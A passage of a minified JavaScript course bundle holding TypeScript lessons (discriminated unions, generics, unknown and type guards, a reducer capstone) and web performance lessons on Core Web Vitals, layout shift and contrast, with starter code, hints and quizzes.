1, name: "Ada", email: "x" }`. Why?',options:["Structural typing is broken","Fresh object literals get an excess-property check against the target","`email` is a reserved field","User must be an interface, not a type alias"],answer:1,explanation:"Freshness: writing the literal inline shows the compiler you're promising a User while adding a field — that's caught. The same value through a variable is fine."},{q:"Where should you nearly always annotate?",options:["Every `const` on every line","Function signatures — parameters and intentional return types at the boundary","Only things you're unsure about","Nowhere — inference is always enough"],answer:1,explanation:"Signatures are contracts other code compiles against; locals are implementation detail the compiler can read for itself."}]},{id:"narrowing",title:"Discriminated Unions & Narrowing",minutes:13,lang:"ts",starter:`type FetchState =
  | { status: "idle" }
  | { status: "loading" }
  | { status: "error"; message: string }
  | { status: "ready"; data: string[] };

// TODO: describe every branch of the union:
//   idle    → "waiting"
//   loading → "loading..."
//   error   → "error: " + message
//   ready   → data.length + " items"
// Once you switch on state.status, TypeScript narrows the union —
// a missing branch should feel impossible, not plausible.
function describe(state: FetchState): string {
  return "?";
}

console.log(describe({ status: "idle" }));
console.log(describe({ status: "loading" }));
console.log(describe({ status: "error", message: "offline" }));
console.log(describe({ status: "ready", data: ["a", "b"] }));`,check:{expr:'output.includes("waiting") && output.includes("loading...") && output.includes("error: offline") && output.includes("2 items")',hint:"Switch on the discriminant (status). Inside each case the compiler has already narrowed `state`, so `message` and `data` exist only where they should.",hints:[{tier:1,text:"Four members, four branches. The `status` literal in each member is the key that tells them apart."},{tier:2,text:'`switch (state.status)` with a `case` per literal. In the `error` case, `state` is narrowed to `{ status: "error"; message: string }`, so `state.message` type-checks — and `state.data` would not.'},{tier:3,text:'`case "ready": return state.data.length + " items";` — omit a case and the compiler tells you the function no longer returns `string` on every path.'}]},body:`A **discriminated union** packs several shapes into one type, tagged by a literal field — usually \`status\` or \`type\`. You already met the idea in plain JavaScript (a \`kind\` field deciding an animal's sound); TypeScript makes the compiler *enforce* the pattern:

\`\`\`
type FetchState =
  | { status: "idle" }
  | { status: "loading" }
  | { status: "error"; message: string }
  | { status: "ready"; data: string[] };
\`\`\`

Read that as: **exactly one of these four, and the tag says which.** Compare it with the boolean-pile:

\`\`\`
// ✗ four impossible combinations you must defend against yourself
{ isLoading: boolean; isError: boolean; data: string[] | null }

// ✓ exactly one state, always
type FetchState = …
\`\`\`

**Narrowing is what makes unions usable.** After you test the discriminant, the compiler shrinks the type to the member you proved — fields become available *only* on the branch where they exist:

\`\`\`
function describe(state: FetchState): string {
  switch (state.status) {
    case "idle":    return "waiting";
    case "loading": return "loading...";
    case "error":   return "error: " + state.message;  // message exists here
    case "ready":   return state.data.length + " items"; // data exists here
  }
}
\`\`\`

Inside \`case "error"\`, writing \`state.data\` is a **compile error** — that member has no \`data\`. This is the whole trick: the impossible states don't render wrong at runtime, they never compile.

**The other narrowing doors** work on any value, not just unions:

| Test | Narrows to |
| --- | --- |
| \`typeof x === "string"\` | string |
| \`"key" in obj\` | obj has key |
| \`x instanceof RangeError\` | RangeError |
| literal check on a discriminant | that union member |

**Exhaustiveness: make omission impossible.** Return a \`string\` from every case and TS checks the end of the function is unreachable — add a fifth state to the union later, and the compiler walks straight to every \`switch\` that forgot it. For if-chains, the \`never\` trick does the same job:

\`\`\`
default: {
  const _exhaustive: never = state;
  return _exhaustive;
}
\`\`\`

That single line converts "I think I covered everything" into a proof — and it's why this pattern powers every reducer, every event bus, and every render-state cascade you'll meet in React, Redux, and effect runners alike.`,quiz:[{q:"The discriminant of a discriminated union is…",options:["A boolean flag you set by hand","A literal field (like `status`) whose value names the member","The index of the member in the union","A class instance check"],answer:1,explanation:'The literal is the tag: checking `status === "error"` identifies exactly which member you\'re holding.'},{q:'Inside `case "error"`, writing `state.data`…',options:["Returns undefined at runtime","Is a compile error — that member has no `data` field","Works if data has a default","Only errors with strictNullChecks"],answer:1,explanation:"Narrowing cuts the other way too: fields exclusive to other members are invisible on this one."},{q:"Four booleans (isLoading, isError, isEmpty, isStale) can encode…",options:["Exactly four states","Sixteen states, most of them nonsense you must defend against","Only states your UI handles","Whatever the compiler picks"],answer:1,explanation:"2⁴ = 16 combinations, like loading AND error AND empty. A union makes each nonsense state unrepresentable instead of merely unlikely."},{q:"An exhaustive switch matters because…",options:["It runs faster than if-chains","Adding a union member later turns every missed branch into a compile error","It's required syntax in TypeScript","switch is the only narrowing form"],answer:1,explanation:"Coverage becomes a compile-time proof — the compiler finds the branches you forgot, not a QA run three weeks later."},{q:'`typeof x === "number"` inside an if-block narrows x to…',options:["any","number — and every use inside the block is checked as a number","string | number","unknown"],answer:1,explanation:"Type guards narrow: the true-branch sees `number`, the false-branch sees whatever remains."}]},{id:"generics",title:"Generics That Pay Rent",minutes:13,lang:"ts",starter:`// TODO: make \`first\` work for ANY array — return the first element,
// or \`fallback\` when the array is empty. No \`any\` allowed.
function first<T>(items: T[], fallback: T): T {
  return fallback;
}

// TODO: count occurrences — group items by the string key each one maps to.
function countBy<T>(items: T[], key: (item: T) => string): Record<string, number> {
  return {};
}

console.log("first:", first(["ada", "lin"], "none"));
console.log("empty:", first([] as string[], "none"));
console.log("colors:", JSON.stringify(countBy(["red", "blue", "red"], (c) => c)));
console.log(
  "widths:",
  JSON.stringify(
    countBy(["a", "bb", "ccc"], (w) => (w.length > 2 ? "long" : "short"))
  )
);`,check:{expr:`output.includes("first: ada") && output.includes("empty: none") && output.includes('"red":2,"blue":1') && output.includes('"short":2,"long":1')`,hint:"The signatures already carry the type — `first` only needs an empty check before indexing; `countBy` starts with an empty record and bumps one key per item (`?? 0` on first sighting).",hints:[{tier:1,text:"`<T>` is a type variable the caller picks for you: call `first` with strings and T is string. Both TODOs are ordinary logic — the generics are already written."},{tier:2,text:"`first` → guard on `items.length`, otherwise return `items[0]`. `countBy` → loop items, `const k = key(item)`, and `out[k] = (out[k] ?? 0) + 1`."},{tier:3,text:"`return items.length ? items[0] : fallback;` and, inside the loop, `const k = key(item); out[k] = (out[k] ?? 0) + 1;` — JSON.stringify prints keys in insertion order, so red lands before blue."}]},body:'Generics are **type functions with parameters**. `<T>` says: *I don\'t know the type yet — the caller decides, and everything stays consistent once they do.*\n\n```\nfunction first<T>(items: T[], fallback: T): T { … }\n\nconst a = first(["ada", "lin"], "none");  // T = string → a: string\nconst b = first([1, 2], 0);               // T = number → b: number\nfirst(["ada"], 0);                        // ✗ fallback must also be a string\n```\n\nThat last line is the point. The generic doesn\'t just pass a type through — it *relates* the arguments. One `T` links `items`, `fallback`, and the return, so a mixed call is caught before it runs.\n\n**Inference happens at the call site.** You rarely write `first<string>(…)`; the arguments are the evidence, exactly like `let n = 0`.\n\n**Constraints: `extends` gives a generic a floor.**\n\n```\nfunction pluck<T, K extends keyof T>(obj: T, key: K): T[K] {\n  return obj[key];\n}\npluck({ id: 1, name: "Ada" }, "name");  // string — key must actually exist\npluck({ id: 1 }, "nope");               // ✗ not keyof the object\n```\n\n`K extends keyof T` means "a key of T" — the compiler now checks keys *and* threads the value type through `T[K]`. Constraint + indexed access is how typed helpers stop being `any`-shaped holes.\n\n**The stdlib is already generic** — reach for these before writing your own:\n\n```\nRecord<string, number>     // object keyed by string, valued by number\nPartial<T>                 // every field optional\nReadonly<T>                // every field readonly\nReturnType<typeof fn>      // the function\'s return type, derived\nPromise<string>            // one promise of one kind\n```\n\n**When NOT to generic.** If there\'s only one concrete type in sight, a generic is ceremony: `function upper(s: string)` beats `function upper<T extends string>(s: T)`. Generics earn their keep at *seams* — utilities, containers, API layers — where the same logic must serve many types without becoming `any`.\n\n```\n// ✗ any: the lie that compiles everything\nfunction first(items: any[], fallback: any): any\n\n// ✓ generic: freedom with the proof still intact\nfunction first<T>(items: T[], fallback: T): T\n```\n\nThe exercise\'s `countBy` is the shape of every group-by you\'ll ever write — a callback that extracts a key, a record that accumulates counts — and it stays fully typed for strings, numbers, objects, whatever the caller brings.',quiz:[{q:"In `function first<T>(items: T[], fallback: T): T`, the single `T` guarantees…",options:["items and fallback always hold the same type, and so does the result","T is always `any`","The function is slower","Only arrays can be passed"],answer:0,explanation:"One type parameter shared across parameters and return — mixing a string array with a number fallback is a compile error."},{q:"`K extends keyof T` reads as…",options:["K extends the class named T","K must be one of T's keys — a constraint, not a union","K and T are interchangeable","T is optional"],answer:1,explanation:"`extends` is the constraint floor: K can be any type up to and including keyof T — practically, a valid key."},{q:"Generics are usually inferred…",options:["From the arguments at the call site","Only when you write `<string>` explicitly","From the function name","From tsconfig"],answer:0,explanation:"Same evidence-based story as everything else: the arguments you pass decide T — explicit type args are the escape hatch."},{q:"`ReturnType<typeof fetchUser>` gives you…",options:['the string "fetchUser"',"the type fetchUser returns, derived instead of duplicated","an error — typeof only works on classes","Promise<any>"],answer:1,explanation:"Utility types derive instead of duplicate — change the function and every derived type follows."},{q:"When is a generic the wrong tool?",options:["When only one concrete type ever exists in the call — annotate that type instead","Never — generics are always better","When the function is async","Inside object literals"],answer:0,explanation:"Generics pay at seams where many types share logic. One known type is a signature, not a type function."}]},{id:"interfaces-types",title:"Interfaces, Aliases & Object Shapes",minutes:11,reading:!0,body:'Two keywords draw the same outline. Knowing when each shines keeps declarations readable:\n\n```\ninterface User { id: number; name: string }   // declaration merging, real interfaces\ntype User = { id: number; name: string };     // unions, intersections, mapped types\n```\n\n**They overlap for object shapes.** Either works for `{ id, name }`; style guides pick one and stay consistent (most pick `type` for aliases, `interface` for contracts others implement).\n\n**Where `interface` wins — merging.** Two declarations of the same interface combine:\n\n```\ninterface Window { analyticsId: string }   // augments the DOM\'s Window\n```\n\nYou can\'t redeclare a `type` — and augmentation is genuinely useful when extending code you don\'t own (React props, library config).\n\n**Where `type` wins — it draws shapes interfaces can\'t:**\n\n```\ntype Status = "idle" | "loading" | "ready";     // union of literals\ntype Pair = [string, number];                    // tuple\ntype Aged = User & { age: number };              // intersection\ntype Callback = (err: Error | null, v?: User) => void;\ntype Keys = keyof User;                          // mapped/derived types\n```\n\nA union of string literals is *the* workhorse of modern frontend: it turns a free-form string into a set you can switch over and exhaustively check — the foundation of the discriminated unions in the previous lesson.\n\n**Optional, undefined, and the third state.** With `strict`, `?` folds `undefined` in:\n\n```\ntype S = { nickname?: string };\nconst a: S = { nickname: undefined };  // ✓ both absent and undefined fit\ns.nickname?.toUpperCase();             // optional chaining survives the check\n```\n\nIf a field should be *present but possibly unknown*, model that honestly (`string | undefined`) rather than overloading `null` as a second undefined.\n\n**Modifiers worth knowing:** `readonly` freezes a property (and `Readonly<T>` derives one); index signatures (`[key: string]: number`) type dynamic keys; `declare` binds an ambient name to something the runtime already provides.\n\n**`satisfies` checks without widening** — the 5.0-era upgrade over `as`:\n\n```\nconst palette = {\n  bg: "#0b0b0c",\n  fg: "#faf8f4",\n} satisfies Record<string, string>;\n\npalette.fg.toUpperCase();   // ✓ still knows fg is string\npalette.bg = 42;            // ✗ caught — `as` would have silenced this\n```\n\n`as` *asserts* (silencing the compiler); `satisfies` *asks* (and keeps the precise inferred type). Reach for `as` only when you genuinely know more than the compiler — never to quiet it.\n\n**Rules of thumb**\n\n1. `type` for unions, tuples, aliases, anything derived.\n2. `interface` for object contracts others implement or augment.\n3. Model optionality with `?`, absence with `undefined` — don\'t invent a second void.\n4. `satisfies` to validate a literal; `as` only when the compiler truly can\'t know.',quiz:[{q:"The key structural difference between interface and type for object shapes is…",options:["Interfaces can't be generic","Interfaces merge with prior declarations of the same name; types can't","Types are checked more strictly","Interfaces are faster to compile"],answer:1,explanation:"Declaration merging is the real differentiator — everything else about plain object shapes is equivalent."},{q:"Which shape can ONLY a `type` alias express?",options:["{ id: number }",'A union of string literals like "idle" | "ready"',"A method-bearing contract","A generic map"],answer:1,explanation:"Interfaces can't be unions — literals, tuples, intersections and conditional types are type-alias territory."},{q:"Under strict mode, `nickname?: string` means the field may be…",options:["absent, or present as string, or explicitly undefined","only absent","null","an error unless checked"],answer:0,explanation:"`?` folds `undefined` into the type — three surface states, two of them indistinguishable, all handled by `?.`."},{q:"`palette satisfies Record<string, string>` vs `… as Record<string, string>` — satisfies is better here because…",options:["It's shorter","It validates the literal against the constraint while keeping the precise property types (`as` would erase them)","It compiles faster","as is deprecated"],answer:1,explanation:'`as` silences the compiler and widens; `satisfies` checks and preserves — fg stays `"#faf8f4"`-ish string, not just any string.'},{q:"A field that exists but might be unknown is best typed as…",options:["null","any","`string | undefined` (or `?`) — the states you actually allow","string, with a comment"],answer:2,explanation:"Type the real state space: present-with-value vs absent. `any` deletes the check; `null` smuggles a second void."}]},{id:"unknown-errors",title:"unknown, Type Guards & Safe Boundaries",minutes:13,lang:"ts",starter:`type Parsed<T> = { ok: true; value: T } | { ok: false; error: string };

// TODO: implement safeParse:
//   1. JSON.parse inside try/catch — a throw returns { ok: false, error }
//   2. on success, run the validator; a false result is also { ok: false }
//   3. only a passing validator returns { ok: true, value }
// \`required\` is a type guard: once it returns true, value is proven to be T.
function safeParse<T>(text: string, required: (v: unknown) => v is T): Parsed<T> {
  return { ok: false, error: "not implemented" };
}

const isUser = (v: unknown): v is { id: number; name: string } => {
  if (typeof v !== "object" || v === null) return false;
  const o = v as Record<string, unknown>;
  return typeof o.id === "number" && typeof o.name === "string";
};

console.log("good:", JSON.stringify(safeParse('{"id":1,"name":"ada"}', isUser)));
console.log("broken:", JSON.stringify(safeParse("{oops", isUser)));
console.log("wrong shape:", JSON.stringify(safeParse('{"id":"1"}', isUser)));`,check:{expr:`output.includes('"ok":true') && output.includes('"name":"ada"') && output.includes('"error":')`,hint:"Three outcomes, three returns: parse threw → error; validator refused → error; validator passed → the value as T. try/catch gives you the first branch for free.",hints:[{tier:1,text:"The union return type already names your cases: ok:true carries the value, ok:false carries the reason. Map each of the three situations to exactly one of them."},{tier:2,text:'Inside `try`: `const value = JSON.parse(text);` then `if (!required(value)) return { ok: false, error: "wrong shape" };` and finally `return { ok: true, value };`. The `catch` returns `{ ok: false, error: … }` built from the thrown value.'},{tier:3,text:"`catch (err)` — err is `unknown` under strict, so narrow it: `err instanceof Error ? err.message : String(err)`."}]},body:'**`any` is a hole in the type system; `unknown` is a locked door.** Both refuse to be checked — but `unknown` refuses to be *used* until you\'ve proven what it is:\n\n```\nconst data: any = JSON.parse(raw);\ndata.buried.deeply;          // compiles — and explodes at runtime\n\nconst data: unknown = JSON.parse(raw);\ndata.buried;                 // ✗ \'data\' is of type \'unknown\'\n```\n\n**JSON.parse returns `any`** — the single largest source of untyped data in real apps. The fix is a boundary: parse into `unknown`, *prove* the shape, then let the inside of the program deal in real types.\n\n**Type guards are the proof.** `value is T` is a promise the compiler takes at face value — which is why guards are written as small functions you can read and test:\n\n```\nconst isUser = (v: unknown): v is { id: number; name: string } => {\n  if (typeof v !== "object" || v === null) return false;\n  const o = v as Record<string, unknown>;\n  return typeof o.id === "number" && typeof o.name === "string";\n};\n\nconst value: unknown = JSON.parse(raw);\nif (isUser(value)) {\n  value.name.toUpperCase();   // ✓ narrowed to the user shape\n}\n```\n\nInside the `if`, `value` is the proven type; outside, it\'s still `unknown`. That\'s narrowing again — the same door as `typeof`/`in`/`instanceof`, just expressed by your own predicate.\n\n**Results instead of throws.** The `Parsed<T>` union in the exercise is the *result pattern* — errors as data:\n\n```\ntype Result<T> = { ok: true; value: T } | { ok: false; error: string };\n// every caller must handle both branches — the compiler won\'t let you\n// unwrap `value` without first excluding the failure case.\n```\n\nLibraries from `fp-ts` to Rust-exports to every SDK\'s `safeParse` use this shape, because a thrown exception is invisible in a type signature while a union is the signature.\n\n**Exceptions changed shape under strict, too.** `catch (err)` binds `unknown` (it always was, at runtime — now the compiler admits it):\n\n```\ntry { … } catch (err) {\n  if (err instanceof Error) throw new Error("parse failed: " + err.message);\n  throw new Error("parse failed: " + String(err));   // never lose the cause\n}\n```\n\n**The discipline, in one line:** *keep `unknown` at the boundary, prove it once, and deal in real types inside.* Every network response, every config file, every `localStorage` read is a boundary — the exercise is that boundary, written three ways.',quiz:[{q:"The core difference between `any` and `unknown`…",options:["any is slower","unknown can't be used until narrowed — any skips all checking","unknown only exists in strict mode","They're synonyms with different names"],answer:1,explanation:"Both disable checking of the value itself, but unknown blocks property access and calls until a guard proves the shape — any waves it through."},{q:"JSON.parse returns…",options:["unknown","the type you annotate it with","any — which is why it needs a boundary treatment","Record<string, unknown>"],answer:2,explanation:"The parser can't know your schema, so it punts with any. Capture it as unknown and validate before trusting it."},{q:"A type guard `v is User` means…",options:["v is definitely a User forever","the compiler may treat v as User inside branches where the guard returned true","v implements an interface named User","A cast with extra steps"],answer:1,explanation:"Narrowing is branch-scoped: outside the if, v remains unknown. The guard's truth is asserted, which is why guards stay small and tested."},{q:"Under strict mode, what does `catch (err)` bind?",options:["any","Error","unknown — you must narrow before using it","string"],answer:2,explanation:"Anything can be thrown, so the honest type is unknown: instanceof-check it or String() it before it touches a message."},{q:"The Result pattern ({ ok: true, value } | { ok: false, error }) wins because…",options:["It's faster than throwing","Failures become part of the type — callers must handle them and can't unwrap blind","It works only in Rust","Exceptions are banned in TypeScript"],answer:1,explanation:"A throw is invisible in a signature; a union forces every caller to confront both branches at compile time."}]},{id:"capstone-type-layer",title:"Capstone: A Type-Safe Data Layer",minutes:20,lang:"ts",starter:`type Todo = { id: number; text: string; done: boolean };
type Filter = "all" | "active" | "done";
type State = { todos: Todo[]; filter: Filter };

type Action =
  | { type: "add"; text: string }
  | { type: "toggle"; id: number }
  | { type: "setFilter"; filter: Filter };

function reducer(state: State, action: Action): State {
  // TODO: three immutable transitions, discriminated by action.type:
  //   add      → append { id: state.todos.length + 1, text, done: false }
  //   toggle   → new array, done flipped on the matching id
  //   setFilter → new state with the new filter
  return state;
}

function visible(state: State): Todo[] {
  // TODO: honour state.filter — "all" returns everything,
  // "active" the undone ones, "done" the finished ones.
  return [];
}

let s: State = { todos: [], filter: "all" };
s = reducer(s, { type: "add", text: "write types" });
s = reducer(s, { type: "add", text: "ship" });
s = reducer(s, { type: "toggle", id: 1 });

console.log("count:", s.todos.length);
console.log("first done:", s.todos[0] && s.todos[0].done);

s = reducer(s, { type: "setFilter", filter: "active" });
console.log("active:", visible(s).map((t) => t.text).join(","));

s = reducer(s, { type: "setFilter", filter: "done" });
console.log("done filter:", visible(s).map((t) => t.text).join(","));

const before = JSON.stringify(s);
const after = reducer(s, { type: "toggle", id: 2 });
console.log("immutable:", JSON.stringify(s) === before);
console.log("toggle landed:", after.todos[1] && after.todos[1].done);`,check:{expr:'output.includes("count: 2") && output.includes("first done: true") && output.includes("active: ship") && output.includes("done filter: write types") && output.includes("immutable: true") && output.includes("toggle landed: true")',hint:"Every transition returns a NEW object — spread state, replace one field. The `action.type` literal is your switch key, and inside each case the compiler narrows `action` to that member.",hints:[{tier:1,text:"State is data, events are a union: the reducer's whole job is picking the right member of Action and rebuilding State around it — nothing mutates in place."},{tier:2,text:"add → `todos: [...state.todos, { id: state.todos.length + 1, text: action.text, done: false }]`. toggle → `todos: state.todos.map((t) => t.id === action.id ? { ...t, done: !t.done } : t)`. setFilter → only `filter` changes. `visible` filters the same todos by the three filter literals."},{tier:3,text:'visible can be one line: `state.filter === "all" ? state.todos : state.todos.filter((t) => state.filter === "done" ? t.done : !t.done)` — narrowing on `state.filter` before reading it isn\'t even needed here, but the ternary keys off exactly the same union.'}]},body:`Everything in this track converges here: **the data layer every React app eventually writes**, typed end to end. Three ideas carry the whole thing.

**1. State is one value, not a pile of flags.** \`State\` in the exercise is a single object whose \`filter\` is a literal union — \`"all" | "active" | "done"\` — so a filter you never defined can't exist. Combine that with the action union and you've made the illegal states unrepresentable *in both directions*: what the view shows, and what can happen next.

**2. Events are data.** An \`Action\` isn't a callback — it's a value describing *what happened*:

\`\`\`
type Action =
  | { type: "add"; text: string }
  | { type: "toggle"; id: number }
  | { type: "setFilter"; filter: Filter };
\`\`\`

Because actions are plain data they can be logged, replayed, time-travelled, tested with a literal array — and each member carries its own payload fields, narrowed for you inside \`case action.type\`. This is the shape of \`useReducer\`, Redux, Zustand's devtools, and every event-sourced backend: **events in, new state out, no mutation anywhere.**

**3. Purity is what makes it testable.** \`reducer(state, action)\` reads nothing and writes nothing — same inputs, same output. The harness in the exercise *is* the test suite:

\`\`\`
expect(reducer(s, { type: "toggle", id: 2 })).not.toBe(s);   // new reference
expect(s.todos[1].done).toBe(false);                          // old untouched
\`\`\`

The \`immutable: true\` line in the exercise is exactly that assertion: serialise before, run the transition, prove nothing behind you changed. In React, that identity change is what lets memoized components trust \`===\`; break it once and every optimisation downstream silently stops working.

**Where this goes next**

- \`useReducer\` drops this exact function into a component — the union becomes the event vocabulary of your UI.
- Persist the *actions*, not the state: a log of events rebuilds any snapshot (that's debugging with replay).
- Add a fifth action member and watch the compiler walk you to every unfinished \`case\` — exhaustiveness pays rent at exactly this moment.
- On the server the same pattern scales: each event is a row, the state is a fold over them, and the type system keeps the fold total.

You've written about forty lines. You've also written the skeleton of every serious state layer you'll meet for the rest of your career — now with a compiler that refuses to let the states and events drift apart.`,quiz:[{q:"Why model actions as a discriminated union instead of `(state) => void` callbacks?",options:["Callbacks are slower","Plain-data events can be logged, replayed and exhaustively checked; each member carries its own payload","Functions can't be typed","Unions are required by React"],answer:1,explanation:"Data describes what happened without doing it — that separability is what enables replay, time travel, and compile-time coverage of every event."},{q:"The reducer must return a NEW state because…",options:["Mutation throws in strict mode","New object identity is what React's memoisation compares — mutate once and every `===` optimisation downstream lies","Spreads are faster than push","State may be frozen at runtime"],answer:1,explanation:"Identity is the signal. Immutable transitions keep renders predictable (and make the `immutable:` assertion in the exercise meaningful)."},{q:'`filter: "all" | "active" | "done"` beats `filter: string` because…',options:["Shorter to type","A typo'd filter becomes a compile error instead of an empty screen","Strings can't be compared","It serialises better"],answer:1,explanation:'Literal unions are closed sets: `filter: "donr"` never compiles, and every switch on it gets exhaustiveness checking for free.'},{q:'Inside `case "toggle"`, `action.id` type-checks because…',options:["All members happen to have id","The discriminant narrows `action` to the toggle member, whose payload is visible there","id is declared on the union itself","strict mode allows unknown fields"],answer:1,explanation:'Same narrowing as FetchState: proving `type === "toggle"` exposes exactly that member\'s fields — and hides the others.'},{q:"Testing this reducer is easy because…",options:["It renders nothing","It's pure — literal state in, literal state out, no DOM, network or clock involved","React Testing Library handles it","Reducers are automatically tested"],answer:1,explanation:"Purity means the entire flow is an array of events folded into an expectation — the harness in the exercise already does it."}]}]},BP={id:"performance",title:"Web Performance & Accessibility",blurb:"Core Web Vitals, layout stability, contrast and keyboard semantics — measured, graded, and shipped as one audit-ready page.",numeral:"XV",lessons:[{id:"web-vitals",title:"Core Web Vitals: What Users Actually Feel",minutes:11,reading:!0,body:`**Performance is not a number on a dashboard — it's three feelings.** Google's Core Web Vitals measure the moments a real person notices slowness: *loading* (did something appear?), *responsiveness* (did my click do anything?), and *visual stability* (did the page jump under my finger?).

| Vital | Measures | Good | Needs work |
| --- | --- | --- | --- |
| \`LCP\` — Largest Contentful Paint | when the hero image or headline paints | ≤ 2.5s | ≤ 4.0s |
| \`INP\` — Interaction to Next Paint | latency of taps across the whole visit | ≤ 200ms | ≤ 500ms |
| \`CLS\` — Cumulative Layout Shift | how much the layout jumps unexpectedly | ≤ 0.1 | ≤ 0.25 |

**INP replaced FID in March 2024.** First Input Delay only measured the *first* tap; INP measures every interaction and keeps the worst one, which is far closer to how frustration actually accumulates.

**Lab data vs. field data.** Lighthouse runs in a throttled lab on one device — great for regression testing in CI, blind to real networks. Field data (Chrome UX Report / CrUX) comes from millions of real sessions in the wild. **When they disagree, believe the field data.**

**Where LCP time actually goes:**

\`\`\`
TTFB (server + network)  →  resource load delay  →  render delay
\`\`\`

\`\`\`js
// A 900ms LCP often decomposes into:
{ ttfb: 600, loadDelay: 200, renderDelay: 100 }
// Fix the biggest term first — usually the server or a lazy hero.
\`\`\`

**The four fixes that move LCP most:** preload the hero image as \`fetchpriority="high"\`, stop hiding it behind client-side fetches, serve modern formats (AVIF/WebP) and sane dimensions, and keep render-blocking CSS small. Meanwhile, images *below* the fold get \`loading="lazy"\` so they don't compete with the hero.

**CLS is almost always a missing dimension.** Images and embeds without \`width\`/\`height\` (or an \`aspect-ratio\`), ads and banners that arrive late, and fonts that swap to a taller fallback all shove content around. Reserve the space in CSS or attributes and the shift disappears. That's the whole game — and the next lesson makes you fix one for real.`,quiz:[{q:"A 'good' Cumulative Layout Shift score is at or below…",options:["0.1","0.25","1.0","0.5"],answer:0,explanation:"CLS ≤ 0.1 is good; 0.1–0.25 needs improvement; above 0.25 is poor. Anything near 1.0 means the page effectively reflows as you read it."},{q:"INP replaced FID because it…",options:["runs only in the lab","measures responsiveness across the entire visit, not just the first tap","measures layout instability","measures time to first byte"],answer:1,explanation:"FID scored only the first interaction. INP scores every interaction and reports a high percentile of the worst, so sustained jank can't hide."},{q:"CrUX (Chrome User Experience Report) data is…",options:["field data aggregated from real users' browsers","lab data from a single emulated device","a JavaScript linter","a bundle-size analyzer"],answer:0,explanation:"CrUX is real-user measurement across millions of Chrome sessions. Lab tools simulate one run; field data reflects what everyone actually experiences."},{q:"Which is NOT a typical LCP candidate?",options:["The hero <img>","A block-level paragraph of text","An inline <svg> illustration","A video poster frame"],answer:2,explanation:"LCP candidates are block-level text, images, video posters and background-images. SVGs and zero-size elements don't count."},{q:"LCP comes in at 4.1s. Which plan attacks the biggest term first?",options:["Add more above-the-fold images",'Preload the hero, set fetchpriority="high", and stop blocking it behind a client-side fetch',"Remove alt text from the hero","Inline every stylesheet on every page"],answer:1,explanation:"Decompose first: TTFB, load delay, render delay. The hero's load delay and render delay are usually the fat terms — preload and unblock them."}]},{id:"layout-shift",title:"Fixing CLS: Reserve the Space",minutes:12,preview:{brief:"The article image arrives and shoves the paragraph down the page. Give the image intrinsic dimensions and alt text — the preview re-renders live as you type.",goal:'On the hero <img>, add width="640" and height="360" so the space is reserved before it loads, plus an alt attribute describing the release-notes screenshot.',html:`<main class="wrap">
  <h1>Release notes</h1>
  <p class="lede">Everything we shipped this week.</p>
  <img class="shot" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 640 360'%3E%3Crect width='640' height='360' fill='%23dbe4f0'/%3E%3Ctext x='50%25' y='50%25' font-family='monospace' font-size='20' text-anchor='middle' fill='%2364748b'%3Escreenshot%3C/text%3E%3C/svg%3E">
  <section class="card">
    <h2>Fixed</h2>
    <p>The crash on empty carts, two flaky tests, and the login redirect loop.</p>
  </section>
</main>`,css:`.wrap { max-width: 42rem; margin: 0 auto; padding: 2rem 1.25rem; font-family: system-ui, sans-serif; color: #0f172a; }
.lede { color: #64748b; margin-top: .5rem; }
.shot { display: block; width: 100%; border-radius: .75rem; background: #e2e8f0; }
.card { margin-top: 1.5rem; padding: 1.25rem; border: 1px solid #e2e8f0; border-radius: .75rem; }`,requires:["img[width][height]","img[alt]"],framework:"none"},body:`**Cumulative Layout Shift is the "I didn't mean to click that" metric.** CLS scores *unexpected* movement: content the user didn't initiate that shifts because space wasn't accounted for beforehand. The most common cause by far is media without intrinsic dimensions.

\`\`\`html
<!-- Before: the browser reserves 0px, the image arrives, everything below moves -->
<img src="shot.jpg">

<!-- After: the browser reserves the exact box from the first byte of HTML -->
<img src="shot.jpg" width="640" height="360" alt="Release notes screenshot">
\`\`\`

**Why attributes and not just CSS?** \`width\`/\`height\` on the \`<img>\` element let the browser compute an \`aspect-ratio\` *while parsing the HTML* — before the stylesheet even applies. That's the moment you need, because CLS penalises shifts that happen early. Modern browsers then apply \`height: auto\` behavior automatically when CSS sets \`width: 100%\`, so the classic broken-image-stretch problem is gone.

**The pattern that covers responsive images too:**

\`\`\`css
.shot {
  aspect-ratio: 16 / 9;  /* reserve the box from CSS when there's no attribute pair */
  width: 100%;
  height: auto;
}
\`\`\`

**The other usual suspects:**

- **Ads, banners, cookie notices** that inject above existing content → reserve a fixed slot, or overlay them.
- **Web fonts** that swap to a taller fallback → \`font-display: optional\` or size-adjusted fallbacks.
- **Lazy images at the bottom of the viewport** that push content *up* as they load → same fix: dimensions.
- **Anything injected by JS before the fold** → the framework should reserve skeleton space.

**What does NOT count as bad CLS:** the user clicking an accordion or scrolling a lazy list. Shifts the *user causes* are excluded by design — the metric is about surprise.`,quiz:[{q:"Why add width/height attributes rather than only CSS?",options:["Attributes are required by the HTML validator","They let the browser derive an aspect-ratio while parsing, reserving space before stylesheets or images load","They make the image load faster","CSS dimensions are ignored for images"],answer:1,explanation:"Early reservation is the whole point: the parse-time aspect ratio means the box exists before the image bytes or even the stylesheet arrive."},{q:"A cookie banner slides in above the footer and pushes content down. The fix is…",options:["Reserve a slot for it, or render it as an overlay","Animate it slower","Remove the footer",'Load it with loading="lazy"'],answer:0,explanation:"Late-arriving content must either own space from the start or not take space at all. Overlays shift nothing beneath them."},{q:"A user opens an accordion and the page below moves. This…",options:["counts as bad CLS","doesn't count — shifts the user initiates are excluded","counts double","only counts on mobile"],answer:1,explanation:"CLS measures *unexpected* movement. Expanding something the user clicked is expected — the API excludes shifts within 500ms of user input."},{q:"Which font setup minimises CLS?",options:["font-display: block with no fallback metrics","font-display: optional (or a metric-matched fallback)","font-display: swap with a much taller fallback","No fallback family at all"],answer:1,explanation:"Swap with a mismatched fallback paints the fallback then reflows on swap. optional (or matched metrics) avoids the swap-time shift entirely."},{q:"Below-the-fold images should usually get…",options:[`loading="lazy" AND width/height — both, so they don't compete with the hero and don't shift when they arrive`,'only loading="lazy"',"only width/height","neither, for performance"],answer:0,explanation:"Lazy-loading protects LCP; dimensions protect CLS. They solve different problems and compose freely."}]},{id:"contrast",title:"Contrast: Reading Is a Feature",minutes:11,preview:{brief:"This hero ships with washed-out greys on white — it looks 'minimal' and fails WCAG. Darken the text and lift the button so every line passes AA.",goal:"Change the h1 to class text-slate-900, the paragraph to text-slate-700, and the button background to bg-indigo-600 (keep text-white).",html:`<main class="min-h-screen 